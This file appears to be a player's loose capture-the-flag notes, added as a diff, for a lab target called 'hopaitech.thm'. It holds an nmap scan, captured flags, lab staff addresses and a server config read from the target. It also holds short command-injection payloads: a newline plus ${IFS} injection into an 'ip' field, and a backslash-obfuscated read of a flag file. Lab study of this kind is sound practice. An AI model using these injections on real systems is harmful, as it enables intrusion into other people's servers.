@@ -1,0 +1,132 @@
+| ?  | HTB{5p3c14l_ch4r5_n0_m0r3\x03  |
+
+ip=127.0.0.1%0als${IFS}-la
+
+vbpass space 
+HTB{1nj3c73d_my_f1r57_c0mm4nd}
+
+adb forward tcp:31415 tcp:31415
+
+ca\t /fla\g.tx\t
+
+think : nopassword
+
+
+22/tcp    open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+25/tcp    open  smtp
+| fingerprint-strings: 
+|   GenericLines: 
+|     220 hopaitech.thm ESMTP HopAI Mail Server Ready
+|     Error: bad syntax
+|     Error: bad syntax
+|   GetRequest: 
+|     220 hopaitech.thm ESMTP HopAI Mail Server Ready
+|     Error: command "GET" not recognized
+|     Error: bad syntax
+|   Hello: 
+|     220 hopaitech.thm ESMTP HopAI Mail Server Ready
+|     Syntax: EHLO hostname
+|   Help: 
+|     220 hopaitech.thm ESMTP HopAI Mail Server Ready
+|     Supported commands: AUTH HELP NOOP QUIT RSET VRFY
+|   NULL: 
+|_    220 hopaitech.thm ESMTP HopAI Mail Server Ready
+|_smtp-commands: hopaitech.thm, SIZE 33554432, 8BITMIME, HELP, 
+53/tcp    open  domain?
+| fingerprint-strings: 
+|   DNSVersionBindReqTCP: 
+|     version
+|_    bind
+80/tcp    open  ssl/http Werkzeug/3.1.4 Python/3.11.14
+|_http-server-header: Werkzeug/3.1.4 Python/3.11.14
+|_http-title: HopAI Technologies - Home
+21337/tcp open  http     Werkzeug httpd 2.0.2 (Python 3.10.12)
+|_http-server-header: Werkzeug/2.0.2 Python/3.10.12
+|_http-title: Unlock Hopper's Memories
+2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port25-TCP:V=7.80%I=7%D=12/18%Time=6944480B%P=x86_64-pc-linux-gnu%r(NUL
+SF:L,31,"220\x20hopaitech\.thm\x20ESMTP\x20HopAI\x20Mail\x20Server\x20Read
+SF:y\r\n")%r(Hello,4C,"220\x20hopaitech\.thm\x20ESMTP\x20HopAI\x20Mail\x20
+SF:Server\x20Ready\r\n501\x20Syntax:\x20EHLO\x20hostname\r\n")%r(Help,68,"
+SF:220\x20hopaitech\.thm\x20ESMTP\x20HopAI\x20Mail\x20Server\x20Ready\r\n2
+SF:50\x20Supported\x20commands:\x20AUTH\x20HELP\x20NOOP\x20QUIT\x20RSET\x2
+SF:0VRFY\r\n")%r(GenericLines,5F,"220\x20hopaitech\.thm\x20ESMTP\x20HopAI\
+SF:x20Mail\x20Server\x20Ready\r\n500\x20Error:\x20bad\x20syntax\r\n500\x20
+SF:Error:\x20bad\x20syntax\r\n")%r(GetRequest,71,"220\x20hopaitech\.thm\x2
+SF:0ESMTP\x20HopAI\x20Mail\x20Server\x20Ready\r\n500\x20Error:\x20command\
+SF:x20\"GET\"\x20not\x20recognized\r\n500\x20Error:\x20bad\x20syntax\r\n");
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port53-TCP:V=7.80%I=7%D=12/18%Time=6944480B%P=x86_64-pc-linux-gnu%r(DNS
+SF:VersionBindReqTCP,20,"\0\x1e\0\x06\x81\x03\0\x01\0\0\0\0\0\0\x07version
+SF:\x04bind\0\0\x10\0\x03");
+MAC Address: 0A:81:71:E9:B4:D9 (Unknown)
+Aggressive OS guesses: Linux 3.10 - 3.13 (95%), Linux 3.8 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Adtran 424RG FTTH gateway (92%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.28 ms 10.80.176.6
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 229.01 seconds
+
+
+
+ceo 
+sir.carrotbane@hopaitech.thm
+CTO
+shadow.whiskers@hopaitech.thm
+DevOps Lead
+obsidian.fluff@hopaitech.thm
+AI Engineer
+nyx.nibbles@hopaitech.thm
+
+Head of AI Research
+midnight.hop@hopaitech.thm
+Senior Security Engineer
+crimson.ears@hopaitech.thm
+Product Manager
+violet.thumper@hopaitech.thm
+System Administrator
+grim.bounce@hopaitech.thm
+
+ns1.hopaitech.thm 172.18.0.3
+www.ns1.hopaitech.thm 172.18.0.3
+
+File contents of '/etc/supervisor/conf.d/supervisord.conf':
+
+[supervisord]
+nodaemon=true
+logfile=/dev/null
+logfile_maxbytes=0
+pidfile=/var/run/supervisord.pid
+
+[program:url-analyzer]
+command=python -u /app/url-analyzer/app.py
+directory=/app/url-analyzer
+autostart=true
+autorestart=true
+stdout_logfile=/dev/fd/1
+stdout_logfile_maxbytes=0
+stderr_logfile=/dev/fd/2
+stderr_logfile_maxbytes=0
+redirect_stderr=true
+
+[program:dns-server]
+command=python -u /app/dns-server/dns_server.py
+directory=/app/dns-server
+autostart=true
+autorestart=true
+stdout_logfile=/dev/fd/1
+stdout_logfile_maxbytes=0
+stderr_logfile=/dev/fd/2
+stderr_logfile_maxbytes=0
+redirect_stderr=true
+
+
+
+
+
